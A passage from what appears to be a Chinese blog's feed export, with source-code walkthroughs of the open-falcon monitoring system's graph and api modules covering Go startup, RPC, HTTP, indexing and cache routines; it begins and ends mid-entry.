        &lt;h2 id=&quot;open-falcon-hbs源码分析&quot;&gt;&lt;a href=&quot;#open-falcon-hbs源码分析&quot; class=&quot;headerlink&quot; title=&quot;open-falcon hbs源码分析&quot;&gt;&lt;/a&gt;open-falcon hbs源码分析&lt;/h2&gt;&lt;p&gt;本篇
      
    
    </summary>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/categories/monitor/"/>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/tags/monitor/"/>
    
  </entry>
  
  <entry>
    <title>open-falcon graph 源码分析</title>
    <link href="http://www.mydreamdll.xyz/2020/01/21/graph%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://www.mydreamdll.xyz/2020/01/21/graph%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2020-01-21T09:07:44.425Z</published>
    <updated>2020-01-21T09:06:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="open-falcon-graph源码分析"><a href="#open-falcon-graph源码分析" class="headerlink" title="open-falcon graph源码分析"></a>open-falcon graph源码分析</h2><p>graph主流程在modules/graph/main中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">g.BinaryName = BinaryName</span><br><span class="line">g.Version = Version</span><br><span class="line">g.GitCommit = GitCommit</span><br><span class="line"></span><br><span class="line">cfg := flag.String(<span class="string">"c"</span>, <span class="string">"cfg.json"</span>, <span class="string">"specify config file"</span>)</span><br><span class="line">version := flag.Bool(<span class="string">"v"</span>, <span class="literal">false</span>, <span class="string">"show version"</span>)</span><br><span class="line">versionGit := flag.Bool(<span class="string">"vg"</span>, <span class="literal">false</span>, <span class="string">"show version and git commit log"</span>)</span><br><span class="line">flag.Parse()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *version &#123;</span><br><span class="line">fmt.Printf(<span class="string">"Open-Falcon %s version %s, build %s\n"</span>, BinaryName, Version, GitCommit)</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> *versionGit &#123;</span><br><span class="line">fmt.Printf(<span class="string">"Open-Falcon %s version %s, build %s\n"</span>, BinaryName, Version, GitCommit)</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// global config</span></span><br><span class="line">    <span class="comment">// 解析配置文件</span></span><br><span class="line">g.ParseConfig(*cfg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> g.Config().Debug &#123;</span><br><span class="line">g.InitLog(<span class="string">"debug"</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">g.InitLog(<span class="string">"info"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// init db</span></span><br><span class="line">    <span class="comment">// 初始化数据库，连接不上失败</span></span><br><span class="line">g.InitDB()</span><br><span class="line"><span class="comment">// rrdtool init</span></span><br><span class="line">    <span class="comment">// rrd初始化</span></span><br><span class="line">rrdtool.InitChannel()</span><br><span class="line"><span class="comment">// rrdtool before api for disable loopback connection</span></span><br><span class="line">rrdtool.Start()</span><br><span class="line"><span class="comment">// start api</span></span><br><span class="line"><span class="keyword">go</span> api.Start()</span><br><span class="line"><span class="comment">// start indexing</span></span><br><span class="line">    <span class="comment">// index更新，定期刷新数据到数据库中</span></span><br><span class="line">index.Start()</span><br><span class="line"><span class="comment">// start http server</span></span><br><span class="line"><span class="keyword">go</span> http.Start()</span><br><span class="line">    <span class="comment">// 定时清理无效数据</span></span><br><span class="line"><span class="keyword">go</span> cron.CleanCache()</span><br><span class="line"></span><br><span class="line">start_signal(os.Getpid(), g.Config())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>rrdtool启动，启动协程定时写磁盘数据</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Start</span><span class="params">()</span></span> &#123;</span><br><span class="line">cfg := g.Config()</span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line"><span class="comment">// check data dir</span></span><br><span class="line"><span class="keyword">if</span> err = file.EnsureDirRW(cfg.RRD.Storage); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">"rrdtool.Start error, bad data dir "</span>+cfg.RRD.Storage+<span class="string">","</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">migrate_start(cfg)</span><br><span class="line"></span><br><span class="line"><span class="comment">// sync disk</span></span><br><span class="line">    <span class="comment">// 写入rdd数据</span></span><br><span class="line"><span class="keyword">go</span> syncDisk()</span><br><span class="line">    <span class="comment">// task不同任务刷新</span></span><br><span class="line"><span class="keyword">go</span> ioWorker()</span><br><span class="line">log.Println(<span class="string">"rrdtool.Start ok"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>api模块启动</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Start</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> !g.Config().Rpc.Enabled &#123;</span><br><span class="line">log.Println(<span class="string">"rpc.Start warning, not enabled"</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">addr := g.Config().Rpc.Listen</span><br><span class="line">tcpAddr, err := net.ResolveTCPAddr(<span class="string">"tcp"</span>, addr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">"rpc.Start error, net.ResolveTCPAddr failed, %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">listener, err := net.ListenTCP(<span class="string">"tcp"</span>, tcpAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">"rpc.Start error, listen %s failed, %s"</span>, addr, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">log.Println(<span class="string">"rpc.Start ok, listening on"</span>, addr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rpc.Register(<span class="built_in">new</span>(Graph))  <span class="comment">// rpc接口注册</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> tempDelay time.Duration <span class="comment">// how long to sleep on accept failure</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">conn, err := listener.Accept()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> tempDelay == <span class="number">0</span> &#123;</span><br><span class="line">tempDelay = <span class="number">5</span> * time.Millisecond</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">tempDelay *= <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> max := <span class="number">1</span> * time.Second; tempDelay &gt; max &#123;</span><br><span class="line">tempDelay = max</span><br><span class="line">&#125;</span><br><span class="line">time.Sleep(tempDelay)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">tempDelay = <span class="number">0</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">e := connects.insert(conn)</span><br><span class="line"><span class="keyword">defer</span> connects.remove(e)</span><br><span class="line">rpc.ServeConn(conn)</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-Close_chan:</span><br><span class="line">log.Println(<span class="string">"rpc, recv sigout and exiting..."</span>)</span><br><span class="line">listener.Close()</span><br><span class="line">Close_done_chan &lt;- <span class="number">1</span></span><br><span class="line"></span><br><span class="line">connects.Lock()</span><br><span class="line"><span class="keyword">for</span> e := connects.list.Front(); e != <span class="literal">nil</span>; e = e.Next() &#123;</span><br><span class="line">e.Value.(net.Conn).Close()</span><br><span class="line">&#125;</span><br><span class="line">connects.Unlock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来初始化内存索引信息：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Start</span><span class="params">()</span></span> &#123;</span><br><span class="line">InitCache()   <span class="comment">//初始化缓存cache统计信息</span></span><br><span class="line"><span class="keyword">go</span> StartIndexUpdateIncrTask()   <span class="comment">//更新索引任务</span></span><br><span class="line">log.Debug(<span class="string">"index.Start ok"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 启动索引的 异步、增量更新 任务, 每隔一定时间，刷新cache中的数据到数据库中</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">StartIndexUpdateIncrTask</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">time.Sleep(IndexUpdateIncrTaskSleepInterval)</span><br><span class="line">startTs := time.Now().Unix()</span><br><span class="line">cnt := updateIndexIncr()</span><br><span class="line">endTs := time.Now().Unix()</span><br><span class="line"><span class="comment">// statistics</span></span><br><span class="line">proc.IndexUpdateIncrCnt.SetCnt(<span class="keyword">int64</span>(cnt))</span><br><span class="line">proc.IndexUpdateIncr.Incr()</span><br><span class="line">proc.IndexUpdateIncr.PutOther(<span class="string">"lastStartTs"</span>, ntime.FormatTs(startTs))</span><br><span class="line">proc.IndexUpdateIncr.PutOther(<span class="string">"lastTimeConsumingInSec"</span>, endTs-startTs)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要针对一些收集到的指标数据更新到数据库中。方便后续查询和报警使用：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 进行一次增量更新</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">updateIndexIncr</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">ret := <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> unIndexedItemCache == <span class="literal">nil</span> || unIndexedItemCache.Size() &lt;= <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dbConn, err := g.GetDbConn(<span class="string">"UpdateIndexIncrTask"</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Error(<span class="string">"[ERROR] get dbConn fail"</span>, err)</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">keys := unIndexedItemCache.Keys()</span><br><span class="line"><span class="keyword">for</span> _, key := <span class="keyword">range</span> keys &#123;</span><br><span class="line">icitem := unIndexedItemCache.Get(key)</span><br><span class="line">unIndexedItemCache.Remove(key)</span><br><span class="line"><span class="keyword">if</span> icitem != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// 并发更新mysql</span></span><br><span class="line">semaUpdateIndexIncr.Acquire()</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(key <span class="keyword">string</span>, icitem *IndexCacheItem, dbConn *sql.DB)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> semaUpdateIndexIncr.Release()</span><br><span class="line">err := updateIndexFromOneItem(icitem.Item, dbConn)  <span class="comment">// 更新数据到数据库</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">proc.IndexUpdateIncrErrorCnt.Incr()</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">IndexedItemCache.Put(key, icitem)</span><br><span class="line">&#125;</span><br><span class="line">&#125;(key, icitem.(*IndexCacheItem), dbConn)</span><br><span class="line">ret++</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>http服务启动</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Start</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> !g.Config().Http.Enabled &#123;</span><br><span class="line">log.Println(<span class="string">"http.Start warning, not enabled"</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !g.Config().Debug &#123;</span><br><span class="line">gin.SetMode(gin.ReleaseMode)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router = gin.Default()</span><br><span class="line"></span><br><span class="line">configCommonRoutes()</span><br><span class="line">configProcRoutes()</span><br><span class="line">configIndexRoutes()</span><br><span class="line"></span><br><span class="line">router.GET(<span class="string">"/api/v2/counter/migrate"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">counter := rrdtool.GetCounterV2()</span><br><span class="line">log.Debug(<span class="string">"migrating counter v2:"</span>, fmt.Sprintf(<span class="string">"%+v"</span>, counter))</span><br><span class="line">c.JSON(<span class="number">200</span>, counter)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//compatible with open-falcon v0.1</span></span><br><span class="line">router.GET(<span class="string">"/counter/migrate"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">cnt := rrdtool.GetCounter()</span><br><span class="line">log.Debug(<span class="string">"migrating counter:"</span>, cnt)</span><br><span class="line">c.JSON(<span class="number">200</span>, gin.H&#123;<span class="string">"msg"</span>: <span class="string">"ok"</span>, <span class="string">"counter"</span>: cnt&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">addr := g.Config().Http.Listen</span><br><span class="line"><span class="keyword">if</span> addr == <span class="string">""</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> router.Run(addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-Close_chan:</span><br><span class="line">log.Info(<span class="string">"http recv sigout and exit..."</span>)</span><br><span class="line">Close_done_chan &lt;- <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定时清理无效数据</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CleanCache</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">ticker := time.NewTicker(time.Duration(g.CLEAN_CACHE) * time.Second)</span><br><span class="line"><span class="keyword">defer</span> ticker.Stop()</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">&lt;-ticker.C</span><br><span class="line">DeleteInvalidItems()   <span class="comment">// 删除无效的GraphItems</span></span><br><span class="line">DeleteInvalidHistory() <span class="comment">// 删除无效的HistoryCache</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来还是看下graph是如何存储数据的：</p><p>接收数据函数是在handleItem函数中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handleItems</span><span class="params">(items []*cmodel.GraphItem)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> items == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">count := <span class="built_in">len</span>(items)</span><br><span class="line"><span class="keyword">if</span> count == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cfg := g.Config()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; count; i++ &#123;</span><br><span class="line"><span class="keyword">if</span> items[i] == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">endpoint := items[i].Endpoint</span><br><span class="line"><span class="keyword">if</span> !g.IsValidString(endpoint) &#123;</span><br><span class="line">log.Debugf(<span class="string">"invalid endpoint: %s"</span>, endpoint)</span><br><span class="line">pfc.Meter(<span class="string">"invalidEnpoint"</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">counter := cutils.Counter(items[i].Metric, items[i].Tags)</span><br><span class="line"><span class="keyword">if</span> !g.IsValidString(counter) &#123;</span><br><span class="line">log.Debugf(<span class="string">"invalid counter: %s/%s"</span>, endpoint, counter)</span><br><span class="line">pfc.Meter(<span class="string">"invalidCounter"</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dsType := items[i].DsType</span><br><span class="line">step := items[i].Step</span><br><span class="line">checksum := items[i].Checksum()</span><br><span class="line">key := g.FormRrdCacheKey(checksum, dsType, step)</span><br><span class="line"></span><br><span class="line"><span class="comment">//statistics</span></span><br><span class="line">proc.GraphRpcRecvCnt.Incr()</span><br><span class="line"></span><br><span class="line"><span class="comment">// To Graph</span></span><br><span class="line">first := store.GraphItems.First(key)</span><br><span class="line"><span class="keyword">if</span> first != <span class="literal">nil</span> &amp;&amp; items[i].Timestamp &lt;= first.Timestamp &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">// 放入缓存队列</span></span><br><span class="line">store.GraphItems.PushFront(key, items[i], checksum, cfg)</span><br><span class="line"></span><br><span class="line"><span class="comment">// To Index</span></span><br><span class="line">index.ReceiveItem(items[i], checksum)</span><br><span class="line"></span><br><span class="line"><span class="comment">// To History</span></span><br><span class="line">store.AddItem(checksum, items[i])</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接收到数据先放到缓存队列，然后写入rrd磁盘或者写入到数据库中完成存档。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;open-falcon-graph源码分析&quot;&gt;&lt;a href=&quot;#open-falcon-graph源码分析&quot; class=&quot;headerlink&quot; title=&quot;open-falcon graph源码分析&quot;&gt;&lt;/a&gt;open-falcon graph源码分析&lt;/
      
    
    </summary>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/categories/monitor/"/>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/tags/monitor/"/>
    
  </entry>
  
  <entry>
    <title>open-falcon api 源码分析</title>
    <link href="http://www.mydreamdll.xyz/2020/01/21/api%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://www.mydreamdll.xyz/2020/01/21/api%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2020-01-21T09:07:43.700Z</published>
    <updated>2020-01-21T09:05:48.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="open-falcon-api源码分析"><a href="#open-falcon-api源码分析" class="headerlink" title="open-falcon api源码分析"></a>open-falcon api源码分析</h2><p>主流程在module/api/main</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">config.BinaryName = BinaryName</span><br><span class="line">config.Version = Version</span><br><span class="line">config.GitCommit = GitCommit</span><br><span class="line"></span><br><span class="line">cfgTmp := flag.String(<span class="string">"c"</span>, <span class="string">"cfg.json"</span>, <span class="string">"configuration file"</span>)</span><br><span class="line">version := flag.Bool(<span class="string">"v"</span>, <span class="literal">false</span>, <span class="string">"show version"</span>)</span><br><span class="line">help := flag.Bool(<span class="string">"h"</span>, <span class="literal">false</span>, <span class="string">"help"</span>)</span><br><span class="line">flag.Parse()</span><br><span class="line">cfg := *cfgTmp</span><br><span class="line"><span class="keyword">if</span> *version &#123;</span><br><span class="line">fmt.Printf(<span class="string">"Open-Falcon %s version %s, build %s\n"</span>, BinaryName, Version, GitCommit)</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *help &#123;</span><br><span class="line">flag.Usage()</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">viper.AddConfigPath(<span class="string">"."</span>)</span><br><span class="line">viper.AddConfigPath(<span class="string">"/"</span>)</span><br><span class="line">viper.AddConfigPath(<span class="string">"./config"</span>)</span><br><span class="line">viper.AddConfigPath(<span class="string">"./api/config"</span>)</span><br><span class="line">cfg = strings.Replace(cfg, <span class="string">".json"</span>, <span class="string">""</span>, <span class="number">1</span>)</span><br><span class="line">viper.SetConfigName(cfg)</span><br><span class="line"></span><br><span class="line">err := viper.ReadInConfig()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 